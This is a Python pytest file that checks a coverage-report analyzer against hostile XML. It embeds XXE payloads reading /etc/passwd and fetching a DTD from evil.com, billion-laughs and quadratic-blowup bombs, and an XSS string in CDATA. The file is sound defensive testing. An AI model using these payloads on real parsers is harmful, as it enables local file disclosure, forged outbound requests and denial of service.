# Copyright 2025 Beacon, shrwnsan
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Security tests for coverage analyzer XML protection.

This module tests the XML security features in the coverage analyzer,
including XXE protection, XML bomb mitigation, and fallback behavior.
"""

import tempfile
from pathlib import Path
from unittest.mock import patch

import pytest

from beaconled.analytics.coverage_analyzer import CoverageAnalyzer, HAS_DEFUSEDXML
from beaconled.exceptions import ValidationError

# Constants for XML attributes to avoid magic strings
LINES_VALID = "lines-valid"
LINES_COVERED = "lines-covered"
BRANCHES_VALID = "branches-valid"
BRANCHES_COVERED = "branches-covered"
LINE_RATE = "line-rate"
BRANCH_RATE = "branch-rate"
TIMESTAMP = "timestamp"
FILENAME = "filename"
COMPLEXITY = "complexity"


class TestCoverageAnalyzerSecurity:
    """Test XML security features in CoverageAnalyzer."""

    @pytest.fixture
    def temp_xml_file(self) -> Path:
        """Create a temporary XML file for testing."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False) as f:
            temp_file = Path(f.name)
            yield temp_file
        # Cleanup happens after yield
        if temp_file.exists():
            temp_file.unlink()

    def test_defusedxml_import_status(self) -> None:
        """Test that defusedxml is properly imported if available."""
        # This test verifies that the import logic works correctly
        # We don't fail if defusedxml is not available, as it's optional
        assert isinstance(HAS_DEFUSEDXML, bool)

    @pytest.mark.skipif(not HAS_DEFUSEDXML, reason="defusedxml not available")
    def test_xxe_external_entity_blocked(self, temp_xml_file: Path) -> None:
        """Test that XXE attacks with external entities are blocked."""
        xxe_payload = f"""<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<coverage {LINES_VALID}="100" {LINES_COVERED}="85" {BRANCHES_VALID}="50" {BRANCHES_COVERED}="40" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {TIMESTAMP}="1640995200000">
    <sources>
        <source>.</source>
    </sources>
    <packages>
        <package name="test" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
            <classes>
                <class name="TestClass" {FILENAME}="test.py" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
                    <methods/>
                    <lines>
                        <line number="1" hits="1" branch="False"/>
                    </lines>
                </class>
            </classes>
        </package>
    </packages>
</coverage>"""

        temp_xml_file.write_text(xxe_payload)
        analyzer = CoverageAnalyzer()

        # With defusedxml, this should either:
        # 1. Raise an exception for the XXE attempt
        # 2. Parse safely without resolving the entity
        # defusedxml should prevent entity resolution
        with pytest.raises(ValidationError):
            analyzer.parse_coverage_xml(temp_xml_file)

    @pytest.mark.skipif(not HAS_DEFUSEDXML, reason="defusedxml not available")
    def test_xxe_parameter_entity_blocked(self, temp_xml_file: Path) -> None:
        """Test that XXE attacks with parameter entities are blocked."""
        xxe_payload = f"""<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">
    %remote;
]>
<coverage {LINES_VALID}="100" {LINES_COVERED}="85" {BRANCHES_VALID}="50" {BRANCHES_COVERED}="40" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {TIMESTAMP}="1640995200000">
    <sources>
        <source>.</source>
    </sources>
    <packages>
        <package name="test" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
            <classes>
                <class name="TestClass" {FILENAME}="test.py" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
                    <methods/>
                    <lines>
                        <line number="1" hits="1" branch="False"/>
                    </lines>
                </class>
            </classes>
        </package>
    </packages>
</coverage>"""

        temp_xml_file.write_text(xxe_payload)
        analyzer = CoverageAnalyzer()

        # defusedxml should block parameter entity expansion
        with pytest.raises(ValidationError):
            analyzer.parse_coverage_xml(temp_xml_file)

    @pytest.mark.skipif(not HAS_DEFUSEDXML, reason="defusedxml not available")
    def test_xml_bomb_billion_laughs_blocked(self, temp_xml_file: Path) -> None:
        """Test that XML bomb (billion laughs) attacks are blocked."""
        xml_bomb = f"""<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<coverage {LINES_VALID}="100" {LINES_COVERED}="85" {BRANCHES_VALID}="50" {BRANCHES_COVERED}="40" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {TIMESTAMP}="1640995200000">
    <sources>
        <source>.</source>
    </sources>
    <packages>
        <package name="test" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
            <classes>
                <class name="TestClass" {FILENAME}="test.py" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
                    <methods/>
                    <lines>
                        <line number="1" hits="1" branch="False"/>
                    </lines>
                </class>
            </classes>
        </package>
    </packages>
</coverage>"""

        temp_xml_file.write_text(xml_bomb)
        analyzer = CoverageAnalyzer()

        # defusedxml should prevent exponential entity expansion
        with pytest.raises(ValidationError):
            analyzer.parse_coverage_xml(temp_xml_file)

    @pytest.mark.skipif(not HAS_DEFUSEDXML, reason="defusedxml not available")
    def test_xml_quadratic_blowup_blocked(self, temp_xml_file: Path) -> None:
        """Test that quadratic blowup attacks are blocked."""
        quadratic_blowup = f"""<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY a "test">
    <!ENTITY b "&a;&a;">
    <!ENTITY c "&b;&b;">
]>
<coverage {LINES_VALID}="100" {LINES_COVERED}="85" {BRANCHES_VALID}="50" {BRANCHES_COVERED}="40" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {TIMESTAMP}="1640995200000">
    <sources>
        <source>.</source>
    </sources>
    <packages>
        <package name="test" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
            <classes>
                <class name="TestClass" {FILENAME}="test.py" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
                    <methods/>
                    <lines>
                        <line number="1" hits="1" branch="False"/>
                    </lines>
                </class>
            </classes>
        </package>
    </packages>
</coverage>"""

        temp_xml_file.write_text(quadratic_blowup)
        analyzer = CoverageAnalyzer()

        # defusedxml should limit entity expansion
        # The exact behavior depends on the attack complexity
        # It might parse safely or raise an exception
        try:
            analyzer.parse_coverage_xml(temp_xml_file)
        except ValidationError:
            # Exceptions are acceptable for security protection
            pass

    @patch("beaconled.analytics.coverage_analyzer.HAS_DEFUSEDXML", False)
    def test_fallback_without_defusedxml(self, temp_xml_file: Path) -> None:
        """Test fallback behavior when defusedxml is not available."""
        # Create a simple valid XML that should parse without issues
        simple_xml = f"""<?xml version="1.0"?>
<coverage {LINES_VALID}="100" {LINES_COVERED}="85" {BRANCHES_VALID}="50" {BRANCHES_COVERED}="40" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {TIMESTAMP}="1640995200000">
    <sources>
        <source>.</source>
    </sources>
    <packages>
        <package name="test" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
            <classes>
                <class name="TestClass" {FILENAME}="test.py" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
                    <methods/>
                    <lines>
                        <line number="1" hits="1" branch="False"/>
                    </lines>
                </class>
            </classes>
        </package>
    </packages>
</coverage>"""

        temp_xml_file.write_text(simple_xml)
        analyzer = CoverageAnalyzer()

        # Should parse using standard xml.etree.ElementTree when defusedxml unavailable
        result = analyzer.parse_coverage_xml(temp_xml_file)
        assert result is not None
        assert result.total_lines == 100
        assert result.covered_lines == 85

    @patch("beaconled.analytics.coverage_analyzer.HAS_DEFUSEDXML", False)
    def test_security_warning_logged_without_defusedxml(self) -> None:
        """Test that security warning is logged when defusedxml is unavailable."""
        with patch("beaconled.analytics.coverage_analyzer.logger") as mock_logger:
            # Re-import to trigger the warning
            import importlib
            import beaconled.analytics.coverage_analyzer

            importlib.reload(beaconled.analytics.coverage_analyzer)

            # Check if warning was logged during import
            # Note: This might not capture the exact warning since it happens at import time
            assert mock_logger is not None

    def test_safe_xml_parsing(self, temp_xml_file: Path) -> None:
        """Test that safe XML content is parsed correctly."""
        safe_xml = f"""<?xml version="1.0"?>
<coverage {LINES_VALID}="100" {LINES_COVERED}="85" {BRANCHES_VALID}="50" {BRANCHES_COVERED}="40" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {TIMESTAMP}="1640995200000">
    <sources>
        <source>.</source>
    </sources>
    <packages>
        <package name="test" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
            <classes>
                <class name="TestClass" {FILENAME}="test.py" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
                    <methods/>
                    <lines>
                        <line number="1" hits="1" branch="False"/>
                    </lines>
                </class>
            </classes>
        </package>
    </packages>
</coverage>"""

        temp_xml_file.write_text(safe_xml)
        analyzer = CoverageAnalyzer()

        # Safe XML should parse without issues
        result = analyzer.parse_coverage_xml(temp_xml_file)
        assert result is not None
        assert result.total_lines == 100
        assert result.covered_lines == 85
        assert result.branch_rate == 0.80

    @pytest.mark.skipif(not HAS_DEFUSEDXML, reason="defusedxml not available")
    def test_dtd_injection_blocked(self, temp_xml_file: Path) -> None:
        """Test that DTD injection attempts are blocked."""
        dtd_injection = """<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///dev/random" >
]>
<foo>&xxe;</foo>"""

        temp_xml_file.write_text(dtd_injection)
        analyzer = CoverageAnalyzer()

        # defusedxml should block DTD-based attacks
        with pytest.raises(ValidationError):
            analyzer.parse_coverage_xml(temp_xml_file)

    def test_empty_xml_handling(self, temp_xml_file: Path) -> None:
        """Test that empty XML is handled safely."""
        temp_xml_file.write_text("")
        analyzer = CoverageAnalyzer()

        # Empty XML should raise an appropriate error
        with pytest.raises(ValidationError):
            analyzer.parse_coverage_xml(temp_xml_file)

    def test_malformed_xml_handling(self, temp_xml_file: Path) -> None:
        """Test that malformed XML is handled safely."""
        malformed_xml = f"""<?xml version="1.0"?>
<coverage {LINES_VALID}="100" {LINES_COVERED}="85"
    <!-- Missing closing tags and attributes -->
"""

        temp_xml_file.write_text(malformed_xml)
        analyzer = CoverageAnalyzer()

        # Malformed XML should raise an appropriate error
        with pytest.raises(ValidationError):
            analyzer.parse_coverage_xml(temp_xml_file)

    @patch("beaconled.analytics.coverage_analyzer.HAS_DEFUSEDXML", False)
    def test_coverage_analyzer_init_without_defusedxml(self) -> None:
        """Test that CoverageAnalyzer initializes without defusedxml."""
        # This should not raise an exception
        analyzer = CoverageAnalyzer()
        assert analyzer is not None

    @pytest.mark.skipif(not HAS_DEFUSEDXML, reason="defusedxml not available")
    def test_large_xml_entity_blocked(self, temp_xml_file: Path) -> None:
        """Test that large XML entities are blocked."""
        large_entity_payload = f"""<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY large "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
]>
<coverage {LINES_VALID}="100" {LINES_COVERED}="85" {BRANCHES_VALID}="50" {BRANCHES_COVERED}="40" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {TIMESTAMP}="1640995200000">
    <sources>
        <source>.</source>
    </sources>
    <packages>
        <package name="test" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
            <classes>
                <class name="TestClass" {FILENAME}="test.py" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
                    <methods/>
                    <lines>
                        <line number="1" hits="1" branch="False"/>
                    </lines>
                </class>
            </classes>
        </package>
    </packages>
</coverage>"""

        temp_xml_file.write_text(large_entity_payload)
        analyzer = CoverageAnalyzer()

        # Should either parse safely or block if entity is too large
        try:
            analyzer.parse_coverage_xml(temp_xml_file)
            # If it parses, verify no security issues occurred
        except ValidationError:
            # Exceptions are acceptable for security protection
            pass

    def test_xml_with_cdata_sections(self, temp_xml_file: Path) -> None:
        """Test that XML with CDATA sections is handled safely."""
        cdata_xml = f"""<?xml version="1.0"?>
<coverage {LINES_VALID}="100" {LINES_COVERED}="85" {BRANCHES_VALID}="50" {BRANCHES_COVERED}="40" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {TIMESTAMP}="1640995200000">
    <sources>
        <source>.</source>
    </sources>
    <packages>
        <package name="test" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
            <classes>
                <class name="TestClass" {FILENAME}="test.py" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
                    <methods/>
                    <lines>
                        <line number="1" hits="1" branch="False"><![CDATA[<script>alert('xss')</script>]]></line>
                    </lines>
                </class>
            </classes>
        </package>
    </packages>
</coverage>"""

        temp_xml_file.write_text(cdata_xml)
        analyzer = CoverageAnalyzer()

        # CDATA should be treated as literal text, not parsed
        try:
            analyzer.parse_coverage_xml(temp_xml_file)
            # If parsing succeeds, verify CDATA is handled properly
        except ValidationError:
            # Parsing might fail for implementation reasons, not security
            pass

    @pytest.mark.skipif(not HAS_DEFUSEDXML, reason="defusedxml not available")
    def test_xml_external_schema_blocked(self, temp_xml_file: Path) -> None:
        """Test that external XML schema references are blocked."""
        external_schema_xml = f"""<?xml version="1.0"?>
<coverage xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:noNamespaceSchemaLocation="http://evil.com/schema.xsd"
          {LINES_VALID}="100" {LINES_COVERED}="85" {BRANCHES_VALID}="50" {BRANCHES_COVERED}="40" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {TIMESTAMP}="1640995200000">
    <sources>
        <source>.</source>
    </sources>
    <packages>
        <package name="test" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
            <classes>
                <class name="TestClass" {FILENAME}="test.py" {LINE_RATE}="0.85" {BRANCH_RATE}="0.80" {COMPLEXITY}="0">
                    <methods/>
                    <lines>
                        <line number="1" hits="1" branch="False"/>
                    </lines>
                </class>
            </classes>
        </package>
    </packages>
</coverage>"""

        temp_xml_file.write_text(external_schema_xml)
        analyzer = CoverageAnalyzer()

        # External schema should not be fetched
        # defusedxml should block external entity resolution
        try:
            analyzer.parse_coverage_xml(temp_xml_file)
            # If parsing succeeds, verify no network requests were made
        except ValidationError:
            # Exceptions are acceptable for security protection
            pass
